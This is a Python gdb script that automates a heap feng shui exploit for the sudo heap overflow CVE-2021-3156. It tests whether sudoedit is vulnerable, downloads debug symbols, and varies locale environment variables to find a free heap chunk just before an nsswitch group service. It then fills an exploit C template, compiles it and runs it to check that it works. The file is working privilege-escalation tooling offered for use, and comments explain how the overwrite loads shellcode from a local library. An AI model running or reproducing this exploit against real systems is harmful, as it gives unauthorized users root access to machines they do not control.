"""
 * Copyright (C) 2021, Luis Molina Garzón, luis@iesvirgendelcarmen.com
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of version 2 of the GNU General Public License as
 * published by the Free Software Foundation.
 *
 * This program is distributed in the hope that it will be useful, but
 * WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 * General Public License for more details.
 *
"""
import gdb
import random
import re
import collections
import os
import subprocess
import requests
from collections import namedtuple

Solution = namedtuple(
    "Solution", "chunk prev_chunk target chunk_size")


class CVE:
    
    def __init__(self):
        self.ddebspath = 'symbols/'
        self.sudoedit = '/usr/bin/sudoedit'

    def test_vuln(self):
        print('[+] Testing if system sudo is vulnerable.')
        cmd = self.sudoedit + ''' -s 'A\\' ''' + 'B' * 65535 + ' > /dev/null'
        out = os.system(cmd)
        if out != 256:
            print('[!] VULNERABLE to CVE-2021-3156:', self.sudoedit)
            return True
        else:
            print("[!] NOT vulnerable:", self.sudoedit)
            return False

    def gen_exploit(self, solution, environment):
        print('[+] Generating exploit.c')
        fin = open('exploit.template', 'rt')
        fout = open('exploit.c', 'wt')
        contents = fin.read()
        contents = contents.replace('{{SUDOEDIT_PATH}}', self.sudoedit)
        contents = contents.replace('{{CHUNK}}', solution.chunk)
        contents = contents.replace('{{CHUNK_SIZE}}', solution.chunk_size)
        contents = contents.replace('{{CHUNK_TARGET}}', solution.target)
        c_environment = ''
        for var in environment:
            c_environment += '"'+var+'",\n\t'
        contents = contents.replace('{{ENVIRONMENT}}', c_environment)
        fout.write(contents)
        fin.close()
        fout.close()

    def execute_exploit(self):
        print('[+] Compiling and executing exploit')
        os.system('make -s clean')
        os.system("env -i 'PATH=/bin:/usr/sbin:/usr/bin' make -s")
        out = os.system('echo "whoami" | ./exploit')
        if out == 0:
            print(
                '[!] Functional exploit generated. [source] ./exploit.c [bin] ./exploit')
            exit()
        else:
            print("Upsss! It's not functional.")


    def install(self):
        import distro
        ossys, osversion, codename = distro.linux_distribution()
        codename = codename.lower().split(' ')[0]
        cmd = subprocess.Popen("dpkg -s sudo | grep Version | cut -d ' ' -f 2", shell=True, stdout=subprocess.PIPE)
        sudoversion = next(cmd.stdout).decode('utf-8').strip()
        cmd = subprocess.Popen('dpkg-architecture -q DEB_BUILD_ARCH', shell=True, stdout=subprocess.PIPE)
        arch = next(cmd.stdout).decode('utf-8').strip()
        #ossys='Debian'
        #sudoversion = '1.8.27-1+deb10u2'
        if 'Debian' in ossys:
            extension = '.deb'
            regex = r'<a href="(.*?)">prev change</a>'
            domain = 'https://snapshot.debian.org'
            url = domain + '/archive/debian-debug/20210208T031650Z/pool/main/s/sudo/'
            counter = 0
            print('[*] Searching sudo-dbgsym in snapshot')
            package = 'sudo-dbgsym_' + sudoversion
            while True:
                print(url)
                response = requests.get(url)
                if response.status_code == 200:
                    if package in response.text:
                        url = url + package + '_' + arch + extension
                        break
                    else:
                        url = domain + re.search(regex, response.text).group(1)
                counter-=1
                if counter > 150: 
                    break
                
        elif 'Ubuntu' in ossys:
            extension = '.ddebs'
            url = 'https://launchpad.net/%s/%s/%s/sudo-dbgsym/%s' % (ossys, codename, arch, sudoversion)
            regex = r'<a class="sprite" href="(.*?.ddeb)">sudo-dbgsym.*?</a>'
            response = requests.get(url)
            if response.status_code != 200:
                print('Error downloading symbols from ', url)
                exit(1)
            url = re.search(regex, response.text).group(1)

        print('Downloading symbols from ', url)
        r = requests.get(url)
        filename = sudoversion+extension
        open(self.ddebspath + filename, 'wb').write(r.content)

        print('Extracting symbols')
        os.system('cd '+ self.ddebspath + ' ; ar x ' + filename)
        os.system('cd '+ self.ddebspath + ' ;tar -Jxf data.tar.xz')


class SilentBreakpoint(gdb.Breakpoint):
    def __init__(self, spec):
        gdb.Breakpoint.__init__(self, spec, internal=True, temporary=True)
        self.silent = True


class Heap:
    def get_tcache(self):
        """
        Obtiene gdb.Value de la variable global tcache con la estructura de datos de la tcachebin
        En ubuntu 18.04 no está disponible la variable global tcache por lo que se extrae
        de mp_sbrk_base
        """
        try:
            tcache = gdb.parse_and_eval('tcache')
        except:
            # Necesario para ubuntu 18.04 no disponible shared object tcache
            tcache_addr = gdb.parse_and_eval('mp_.sbrk_base + 0x10')
            tcache_type = gdb.lookup_type(
                'struct tcache_perthread_struct').pointer()
            tcache = tcache_addr.cast(tcache_type)
        return tcache

    def get_tcachebins(self):
        """
        Parsea la variable local tcache de malloc.c para encontrar los chunks reciclables de la tcache.
        Se podría analizar también fastbins.
        Se añade solo el primer chunk de cada tamaño.
        """
        tcachebin = {}
        tcache = self.get_tcache()
        size = 0x20
        for i in range(0, 64):
            chunk = tcache.dereference()['entries'][i]
            if chunk != 0x0:
                tcachebin[str(chunk)] = hex(size)
            size += 0x10
        return tcachebin

    def get_fastbins(self):
        regex = '(0x[0-9a-f]*)'
        fastbins = {}
        bins = gdb.parse_and_eval('main_arena.fastbinsY')
        size = 0x20
        for i in range(0, 10):
            chunk = bins[i]
            if chunk != 0x0:
                chunk = re.search(regex, str(chunk)).group(1)
                fastbins[chunk] = hex(size)
            size += 0x10
        return fastbins

    def get_smallbins(self):
        regex = '(0x[0-9a-f]*)'
        smallbins = {}
        bins = gdb.parse_and_eval('main_arena.bins')
        size = 0x20
        #1 unsorted bin
        #2..63 smallbin
        #64..126 largebins
        for i in range(0, 62): 
            fd = bins[i*2+2]
            bk = bins[i*2+2]
            fd = re.search(regex, str(fd)).group(1)
            bk = re.search(regex, str(bk)).group(1)
            if fd != bk:
                smallbins[str(bk)] = hex(size)
                print(fd, bk, size)                
            size += 0x10
        return smallbins


class FengShui:
    stat_val = 'C.UTF-8@'

    def __init__(self):
        """
            locales
                lista de posibles variables de entorno. Otro tipo de variables no afectan al layout en sudo
            max_locale_value
                tamaño máximo del padding de 'B' de las variables de entorno
            max_num_locales
                número máximo de variables de entorno a crear en el environment
        """
        self.max_locale_value = 0xff
        self.locales = ['LANG', 'LANGUAGE', 'LC_CTYPE', 'LC_NUMERIC', 'LC_TIME', 'LC_COLLATE', 'LC_MONETARY', 'LC_MESSAGES',
                        'LC_PAPER', 'LC_NAME', 'LC_ADDRESS', 'LC_TELEPHONE', 'LC_MEASUREMENT', 'LC_IDENTIFICATION', 'LC_ALL']
        self.max_num_locales = 10
        self.environment = []
        self.r = random.Random()
        # self.r.seed("seed")

    def set_env(self):
        """ 
        Crea un conjunto de variables de entorno de "locales" de tamaño aleatorio
        ejemplo: LC_ALL=C.UTF-8@BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
        sudo crea estructuras en el heap con los locales. El objetivo es crear los huecos
        necesarios para el fengshui.
        """
        n = self.r.randint(0, self.max_num_locales)
        self.r.shuffle(self.locales)
        for locale in self.locales[0:n]:
            value = 'B' * self.r.randint(0, self.max_locale_value)
            env = 'set env ' + locale + ' ' + self.stat_val + value
            self.environment.append(locale+'='+self.stat_val + value)
            gdb.execute(env)

    def service_table_layout(self):
        """
        Se analiza la estructura service_table para crear una lista ordenada de los chunks
        que se encuentran en el heap. 

        layout es un diccionario. key => chunk address, value => descripción

        Se añaden al diccionario layout las estructuras service_user, name_database_entry
        """
        char_pointer_type = gdb.lookup_type('char').pointer()
        service_table = gdb.parse_and_eval('service_table')
        heap_layout = {}
        heap_layout[str(service_table)] = 'service_table'
        database = service_table.dereference()['entry']
        while database != 0x0:
            dname = database.dereference()['name'].cast(
                char_pointer_type).string()
            heap_layout[str(database)] = "Database: " + dname
            service = database.dereference()['service']
            while(service != 0x0):
                sname = service.dereference()['name'].cast(
                    char_pointer_type).string()
                heap_layout[str(service)] = "Service: " + sname + ' ' + dname
                service = service.dereference()['next']
            database = database.dereference()['next']
        return heap_layout

    def find_chunk(self, heap_layout, tcachebin, service):
        """
        Localiza el objetivo en service_table
        El objetivo es el servicio (files group, systemd group, compat group) ya que sudo usa nsswitch para acceder a la base
        de datos de grupos después del desbordamiento. Esto hace que se cargen en memoria las librerías:
        libnss_XXXX.so.2 (files, systemd, compat)

        El objetivo es desbordar el buffer y sobreescribir la estructura service_user para cambiar el string
        files o systemd para cargar una librería local con la shellcode

        Recorremos la estructura service_table buscando un chunk reciclable en tcache justo antes del servicio objetivo.
        El chunk no debe sobreescribir ninguna estructura de nsswitch para no generar un crash.

        Esto es mejorable es posible que funcione el exploit sobreescribiendo algunas estructuras.
        """
        items = list(heap_layout.items())
        first = '0x0'
        last = None
        for address, name in items:
            if name == 'Service: ' + service + ' group':
                last = address
                break
            else:
                first = address
        if last:
            for chunkaddr, size in tcachebin.items():
                if chunkaddr > first and chunkaddr < last:
                    return Solution(chunkaddr, first, last, size)
        return None

    def find_solution(self, heap_layout, tcachebin):
        """
        Se buscan chunks libres justo antes de los servicios de group
        """
        services = ['files', 'compat', 'systemd']
        for service in services:
            solution = self.find_chunk(heap_layout, tcachebin, service)
            if solution:
                return solution

    def fengshui(self, cve):
        """
        Ejecuta sudoedit con -s.
        Para en la función set_cmnd del plugin sudoers
        Se analiza la estructura de datos de nss buscando la base de datos groups y service file o systemd
        Se busca un chunk libre en tcachebin justo antes del service de forma que no se sobreescriban otros services.
        """
        self.environment = []
        gdb.execute('file ' + cve.sudoedit)
        gdb.execute('delete breakpoints')
        bm = SilentBreakpoint('main')
        gdb.execute('unset environment')
        gdb.execute('set pagination off')
        self.set_env()
        cmnd = 'r -s ' + 'A' * self.r.randint(1, 0xff)
        bp = SilentBreakpoint('policy_check')
        o = gdb.execute(cmnd, to_string=True)
        o = gdb.execute('c', to_string=True)
        bc = SilentBreakpoint('set_cmnd')
        heap_layout = self.service_table_layout()
        heap_layout = collections.OrderedDict(sorted(heap_layout.items()))        
        o = gdb.execute('c', to_string=True)
        try:
            bins = Heap().get_tcachebins()
            return self.find_solution(heap_layout, bins)
        except:
            #No hay tcache
            bins = Heap().get_fastbins()
            solution = self.find_solution(heap_layout, bins)
            if solution != None:
                return solution
            bins = Heap().get_smallbins()
            return self.find_solution(heap_layout, bins)

        

    def go(self):
        print('[*] Generating Exploit For sudo CVE-2021-3156 with Heap feng shui')
        print('[*] Author: Luis Molina')
        cve = CVE()
        if not cve.test_vuln():
            return
        cve.install()
        #Set symbols
        gdb.execute('set debug-file-directory /usr/lib/debug:symbols/usr/lib/debug')
        n = 0
        found = 0
        while True:
            if n % 10 == 0:
                print(
                    '[+] sudo executions: #'+str(n)+', not functionals: #' + str(found))
            solution = self.fengshui(cve)
            if solution != None:
                tam = len(''.join(self.environment))
                bof_size = int(solution.target, 16) - int(solution.chunk, 16)
                print('[!] New solution found: ', solution)
                print('[!] environment_size:'+str(tam)+' bof_size:' + str(bof_size))
                found += 1
                cve.gen_exploit(solution, self.environment)
                cve.execute_exploit()
            n += 1


if __name__ == '__main__':
    feng = FengShui()
    feng.go()
    gdb.execute('quit')
